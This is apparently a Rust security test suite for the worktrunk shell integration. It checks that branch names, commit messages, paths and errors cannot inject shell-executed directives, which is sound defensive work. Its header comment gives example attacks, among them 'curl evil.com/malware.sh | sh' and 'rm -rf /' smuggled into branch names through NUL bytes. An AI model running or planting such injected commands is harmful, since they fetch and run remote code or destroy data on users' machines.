//! Security tests for directive injection vulnerabilities
//!
//! # Attack Surface Analysis
//!
//! Worktrunk uses a directive protocol for shell integration. Commands with `--internal` output
//! special directives that the shell wrapper interprets:
//!
//! - `__WORKTRUNK_CD__/path\0` → shell executes `cd /path`
//! - `__WORKTRUNK_EXEC__command\0` → shell executes `eval command`
//! - Other output → printed to user
//!
//! ## Vulnerability: Directive Injection
//!
//! If external content (branch names, commit messages, file paths, git output) can inject these
//! magic strings into stdout, the shell will execute them. This is analogous to SQL injection
//! or command injection vulnerabilities.
//!
//! ## Attack Vectors
//!
//! ### 1. NUL Byte Injection (HIGH RISK)
//!
//! The shell wrapper splits output on NUL bytes (`\0`). If an attacker can inject a NUL byte
//! followed by a directive into user content, they can execute arbitrary commands.
//!
//! **Example attack:**
//! ```bash
//! # Create branch with malicious name containing NUL + directive
//! git branch $'feature\0__WORKTRUNK_EXEC__curl evil.com/malware.sh | sh'
//! wt switch --internal $'feature\0__WORKTRUNK_EXEC__curl evil.com/malware.sh | sh'
//! ```
//!
//! When worktrunk outputs:
//! ```
//! ✅ Switched to feature\0__WORKTRUNK_EXEC__curl evil.com/malware.sh | sh\0
//! ```
//!
//! The shell splits this into two chunks:
//! 1. `✅ Switched to feature` (printed)
//! 2. `__WORKTRUNK_EXEC__curl evil.com/malware.sh | sh` (EXECUTED!)
//!
//! ### 2. Line-Start Directive Injection (MEDIUM RISK)
//!
//! If user content appears at the start of a line/chunk, it could be misinterpreted as a directive.
//!
//! **Example attack:**
//! ```bash
//! # Branch name that looks like a directive
//! git branch '__WORKTRUNK_EXEC__rm -rf /'
//! wt switch --internal '__WORKTRUNK_EXEC__rm -rf /'
//! ```
//!
//! If output is poorly formatted, this could be executed.
//!
//! ### 3. Newline + Directive Injection (MEDIUM RISK)
//!
//! Similar to NUL injection, but using newlines. Less dangerous since directives should be
//! NUL-terminated, but could cause issues with certain output paths.
//!
//! **Example attack:**
//! ```bash
//! git commit -m $'Fix bug\n__WORKTRUNK_EXEC__evil_command'
//! ```
//!
//! ### 4. Path Injection (LOW RISK)
//!
//! File paths or worktree paths containing directives.
//!
//! **Example attack:**
//! ```bash
//! mkdir '__WORKTRUNK_EXEC__evil_command'
//! ```
//!
//! ## Current Protections
//!
//! **Multi-layered defense against NUL injection:**
//!
//! 1. **Git layer**: Git REJECTS NUL bytes in commit messages and ref names
//!    ```
//!    $ git commit -m $'Fix\0__WORKTRUNK_EXEC__evil'
//!    error: a NUL byte in commit log message not allowed.
//!    ```
//!
//! 2. **Filesystem layer**: OS truncates filenames at NUL byte
//!    ```
//!    $ touch $'file\0evil'  # Creates "file", not "file\0evil"
//!    ```
//!
//! 3. **Rust layer**: Command API rejects NUL bytes in arguments
//!    ```rust
//!    Command::new("git").arg("branch\0evil")  // Error: InvalidInput
//!    ```
//!
//! 4. **Directive protocol**:
//!    - **NUL termination**: Directives are NUL-terminated, creating natural boundaries
//!    - **Prefix matching**: Shell wrapper checks if chunks START with `__WORKTRUNK_CD__` or `__WORKTRUNK_EXEC__`
//!
//! ## Vulnerabilities We Test
//!
//! This test suite verifies that user-controlled content CANNOT inject directives:
//!
//! 1. ✅ Branch names with NUL bytes + directives
//! 2. ✅ Branch names that are directives themselves
//! 3. ✅ Commit messages with directives
//! 4. ✅ File paths with directives
//! 5. ✅ Git hook output with directives (when implemented)
//! 6. ✅ Config values with directives (when implemented)
//!
//! ## Gaps & Future Work
//!
//! ### Known Vulnerabilities (Not Yet Protected)
//!
//! - **No escaping of user content**: User content (branch names, paths) is output as-is
//! - **Same channel for directives and messages**: Both use stdout, making injection possible
//! - **No cryptographic verification**: Shell can't verify directives came from worktrunk
//!
//! ### Potential Solutions
//!
//! 1. **Escape user content** (RECOMMENDED):
//!    - Before outputting any external content, replace `__WORKTRUNK_` with `__WORKTRUNK\u{200B}_` (zero-width space)
//!    - Or strip NUL bytes from user content
//!    - Simple, effective, backward-compatible
//!
//! 2. **Separate channels**:
//!    - Directives on stdout, user messages on stderr
//!    - Hard to maintain temporal ordering
//!
//! 3. **Cryptographic signing**:
//!    - Sign each directive with a session secret
//!    - Complex, may not be worth it
//!
//! 4. **Structural encoding**:
//!    - Use a structured format (JSON lines, msgpack) instead of raw text
//!    - More robust but requires changing shell wrapper
//!
//! ### Testing Limitations
//!
//! These tests verify that:
//! - The binary doesn't accidentally execute directives from user content
//! - The output format is as expected
//!
//! However, they DON'T fully test shell execution security because:
//! - Tests run the Rust binary, not the shell wrapper
//! - Full end-to-end tests with malicious shell wrapper input are in `shell_wrapper.rs`
//!
//! For comprehensive security testing, see `tests/integration_tests/shell_wrapper.rs` which
//! tests the full shell integration pipeline.

use crate::common::{TestRepo, setup_snapshot_settings, wt_command};
use insta::Settings;
use insta_cmd::assert_cmd_snapshot;
use std::process::Command;

/// Test that Git rejects NUL bytes in commit messages
///
/// Git provides the first line of defense by refusing to create commits
/// with NUL bytes in the message.
#[test]
fn test_git_rejects_nul_in_commit_messages() {
    use std::process::Stdio;

    let repo = TestRepo::new();
    repo.commit("Initial commit");

    // Try to create a commit with NUL in the message
    // We can't use Command::arg() because Rust rejects NUL bytes,
    // so we use printf piped to git commit -F -
    let malicious_message = "Fix bug\0__WORKTRUNK_EXEC__echo PWNED";

    // Create a file to commit
    std::fs::write(repo.root_path().join("test.txt"), "content").unwrap();
    let mut add_cmd = Command::new("git");
    repo.configure_git_cmd(&mut add_cmd);
    add_cmd
        .args(["add", "."])
        .current_dir(repo.root_path())
        .output()
        .unwrap();

    // Try to commit with NUL in message using shell redirection
    let shell_cmd = format!(
        "printf '{}' | git commit -F -",
        malicious_message.replace('\0', "\\0")
    );

    let mut cmd = Command::new("sh");
    repo.configure_git_cmd(&mut cmd);
    cmd.arg("-c")
        .arg(&shell_cmd)
        .current_dir(repo.root_path())
        .stdout(Stdio::null())
        .stderr(Stdio::piped());

    let output = cmd.output().unwrap();

    // Git should reject this
    assert!(
        !output.status.success(),
        "Expected git to reject NUL bytes in commit message"
    );

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("NUL byte") || stderr.contains("nul byte"),
        "Expected git to complain about NUL bytes, got: {}",
        stderr
    );
}

/// Test that Rust/OS prevents NUL bytes in command arguments
///
/// This verifies that the OS/Rust provides protection against NUL injection.
/// Rust's Command API uses C strings internally, which reject NUL bytes.
#[test]
fn test_rust_prevents_nul_bytes_in_args() {
    let repo = TestRepo::new();
    repo.commit("Initial commit");

    // Rust's Command API should reject NUL bytes in arguments
    let malicious_branch = "feature\0__WORKTRUNK_EXEC__echo PWNED";

    let mut cmd = Command::new("git");
    repo.configure_git_cmd(&mut cmd);
    cmd.args(["branch", malicious_branch])
        .current_dir(repo.root_path());

    // Command::output() should fail with InvalidInput error
    let result = cmd.output();

    match result {
        Err(e) if e.kind() == std::io::ErrorKind::InvalidInput => {
            // Good! Rust prevented the NUL byte injection
        }
        Ok(output) => {
            panic!(
                "Expected Rust to reject NUL bytes in args, but command succeeded: {:?}",
                output
            );
        }
        Err(e) => {
            panic!(
                "Expected InvalidInput error for NUL bytes, got different error: {:?}",
                e
            );
        }
    }
}

/// Test that branch names that ARE directives themselves don't get executed
///
/// This tests the case where the entire branch name is a directive
#[test]
fn test_branch_name_is_directive_not_executed() {
    let repo = TestRepo::new();
    repo.commit("Initial commit");

    let malicious_branch = "__WORKTRUNK_EXEC__echo PWNED > /tmp/hacked2";

    // Try to create this branch
    let mut cmd = Command::new("git");
    repo.configure_git_cmd(&mut cmd);
    cmd.args(["branch", malicious_branch])
        .current_dir(repo.root_path());

    let result = cmd.output().expect("Failed to run git branch");

    if !result.status.success() {
        // Git rejected the malicious branch name
        return;
    }

    let mut settings = Settings::clone_current();
    settings.set_snapshot_path("../snapshots");
    settings.add_filter(r"__WORKTRUNK_CD__[^\x00]+", "__WORKTRUNK_CD__[PATH]");

    settings.bind(|| {
        let mut cmd = wt_command();
        repo.clean_cli_env(&mut cmd);
        cmd.arg("--internal")
            .arg("switch")
            .arg("--create")
            .arg(malicious_branch)
            .current_dir(repo.root_path());

        assert_cmd_snapshot!(cmd);
    });

    // Verify the malicious file was NOT created
    assert!(
        !std::path::Path::new("/tmp/hacked2").exists(),
        "Malicious code was executed! File /tmp/hacked2 should not exist"
    );
}

/// Test that branch names with newline + directive are not executed
#[test]
fn test_branch_name_with_newline_directive_not_executed() {
    let repo = TestRepo::new();
    repo.commit("Initial commit");

    let malicious_branch = "feature\n__WORKTRUNK_EXEC__echo PWNED > /tmp/hacked3";

    let mut cmd = Command::new("git");
    repo.configure_git_cmd(&mut cmd);
    cmd.args(["branch", malicious_branch])
        .current_dir(repo.root_path());

    let result = cmd.output().expect("Failed to run git branch");

    if !result.status.success() {
        return;
    }

    let mut settings = Settings::clone_current();
    settings.set_snapshot_path("../snapshots");
    settings.add_filter(r"__WORKTRUNK_CD__[^\x00]+", "__WORKTRUNK_CD__[PATH]");

    settings.bind(|| {
        let mut cmd = wt_command();
        repo.clean_cli_env(&mut cmd);
        cmd.arg("--internal")
            .arg("switch")
            .arg("--create")
            .arg(malicious_branch)
            .current_dir(repo.root_path());

        assert_cmd_snapshot!(cmd);
    });

    assert!(
        !std::path::Path::new("/tmp/hacked3").exists(),
        "Malicious code was executed!"
    );
}

/// Test that commit messages with directives in list output don't get executed
///
/// This tests if commit messages shown in output (e.g., wt list, logs) could inject directives
#[test]
fn test_commit_message_with_directive_not_executed() {
    use crate::common::setup_snapshot_settings;

    let mut repo = TestRepo::new();

    // Create commit with malicious message (no NUL - Rust prevents those)
    let malicious_message = "Fix bug\n__WORKTRUNK_EXEC__echo PWNED > /tmp/hacked4";
    repo.commit_with_message(malicious_message);

    // Create a worktree
    let _feature_wt = repo.add_worktree("feature", "feature");

    let settings = setup_snapshot_settings(&repo);

    // Run 'wt list' which might show commit messages
    settings.bind(|| {
        let mut cmd = wt_command();
        repo.clean_cli_env(&mut cmd);
        cmd.arg("list").current_dir(repo.root_path());

        // Verify output - commit message should be escaped/sanitized
        assert_cmd_snapshot!(cmd);
    });

    // Verify the malicious file was NOT created
    assert!(
        !std::path::Path::new("/tmp/hacked4").exists(),
        "Malicious code was executed from commit message!"
    );
}

/// Test that path display with directives doesn't get executed
///
/// This tests if file paths shown in output could inject directives
#[cfg(unix)]
#[test]
fn test_path_with_directive_not_executed() {
    use crate::common::setup_snapshot_settings;

    let repo = TestRepo::new();
    repo.commit("Initial commit");

    // Create a directory with a malicious name
    let malicious_dir = repo
        .root_path()
        .join("__WORKTRUNK_EXEC__echo PWNED > /tmp/hacked5");
    std::fs::create_dir_all(&malicious_dir).expect("Failed to create malicious directory");

    let settings = setup_snapshot_settings(&repo);

    // Run a command that might display this path
    settings.bind(|| {
        let mut cmd = wt_command();
        repo.clean_cli_env(&mut cmd);
        cmd.arg("list").current_dir(repo.root_path());

        assert_cmd_snapshot!(cmd);
    });

    assert!(
        !std::path::Path::new("/tmp/hacked5").exists(),
        "Malicious code was executed from path display!"
    );
}

/// Test that CD directive in branch names is not treated as a directive
///
/// Similar to EXEC injection, but for CD directives
#[test]
fn test_branch_name_with_cd_directive_not_executed() {
    let repo = TestRepo::new();
    repo.commit("Initial commit");

    // Branch name that IS a CD directive (no NUL - git allows this)
    let malicious_branch = "__WORKTRUNK_CD__/tmp";

    let mut cmd = Command::new("git");
    repo.configure_git_cmd(&mut cmd);
    cmd.args(["branch", malicious_branch])
        .current_dir(repo.root_path());

    let result = cmd.output().expect("Failed to run git branch");

    if !result.status.success() {
        // Git rejected it - that's fine, nothing to test
        return;
    }

    let mut settings = setup_snapshot_settings(&repo);
    settings.add_filter(r"__WORKTRUNK_CD__[^\x00]+", "__WORKTRUNK_CD__[PATH]");

    settings.bind(|| {
        let mut cmd = wt_command();
        repo.clean_cli_env(&mut cmd);
        cmd.arg("--internal")
            .arg("switch")
            .arg("--create")
            .arg(malicious_branch)
            .current_dir(repo.root_path());

        // Branch name should appear in success message, but not as a separate directive
        assert_cmd_snapshot!(cmd);
    });
}

/// Test that error messages cannot inject directives
///
/// This tests if error messages (e.g., from git) could inject directives
#[test]
fn test_error_message_with_directive_not_executed() {
    let repo = TestRepo::new();
    repo.commit("Initial commit");

    // Try to switch to a non-existent branch with a name that looks like a directive
    let malicious_branch = "__WORKTRUNK_EXEC__echo PWNED > /tmp/hacked6";

    let settings = setup_snapshot_settings(&repo);

    settings.bind(|| {
        let mut cmd = wt_command();
        repo.clean_cli_env(&mut cmd);
        cmd.arg("--internal")
            .arg("switch")
            .arg(malicious_branch)
            .current_dir(repo.root_path());

        // Should fail with error, but not execute directive
        assert_cmd_snapshot!(cmd);
    });

    assert!(
        !std::path::Path::new("/tmp/hacked6").exists(),
        "Malicious code was executed from error message!"
    );
}

/// Test that execute flag (-x) input is properly handled
///
/// The -x flag is SUPPOSED to execute commands, so this tests that:
/// 1. Commands from -x are executed via __WORKTRUNK_EXEC__
/// 2. User content in branch names that looks like directives doesn't inject extra executions
#[test]
fn test_execute_flag_with_directive_like_branch_name() {
    let repo = TestRepo::new();
    repo.commit("Initial commit");

    // Branch name that looks like a directive
    let malicious_branch = "__WORKTRUNK_EXEC__echo PWNED > /tmp/hacked7";

    let mut cmd = Command::new("git");
    repo.configure_git_cmd(&mut cmd);
    cmd.args(["branch", malicious_branch])
        .current_dir(repo.root_path());

    let result = cmd.output().expect("Failed to run git branch");

    if !result.status.success() {
        // Git rejected the branch name
        return;
    }

    let mut settings = Settings::clone_current();
    settings.set_snapshot_path("../snapshots");
    settings.add_filter(r"__WORKTRUNK_CD__[^\x00]+", "__WORKTRUNK_CD__[PATH]");

    settings.bind(|| {
        let mut cmd = wt_command();
        repo.clean_cli_env(&mut cmd);
        cmd.arg("--internal")
            .arg("switch")
            .arg("--create")
            .arg(malicious_branch)
            .arg("-x")
            .arg("echo legitimate command")
            .current_dir(repo.root_path());

        // Should see ONE __WORKTRUNK_EXEC__ from the -x flag
        // The branch name should NOT create a second directive
        assert_cmd_snapshot!(cmd);
    });

    // The legitimate command would execute (we're not actually running the shell wrapper),
    // but the injected command should NOT
    assert!(
        !std::path::Path::new("/tmp/hacked7").exists(),
        "Malicious code was executed alongside legitimate -x command!"
    );
}
